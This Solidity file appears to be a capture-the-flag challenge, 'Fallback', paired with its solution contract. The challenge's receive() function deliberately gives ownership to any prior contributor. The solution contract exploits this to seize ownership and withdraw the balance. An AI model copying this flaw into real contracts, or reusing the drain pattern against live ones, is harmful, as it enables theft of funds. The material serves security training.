// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

contract FallbackSolution {
    constructor(address _challengeAddress) public payable {
        require(msg.value == 0.002 ether, "Incorrect value");

        Fallback challenge = Fallback(payable(_challengeAddress));
        challenge.contribute{value: 0.0009 ether}();
        (bool sent, ) = address(challenge).call{value: 0.001 ether}("");

        require(sent, "transfer failed");
        require(challenge.owner() == address(this), "owner did not transfer");

        challenge.withdraw();
        require(address(this).balance == 0.002 ether);
        
        (sent, ) = msg.sender.call{value: 0.002 ether}("");
        require(sent, "unable to transfer all back");
    }
}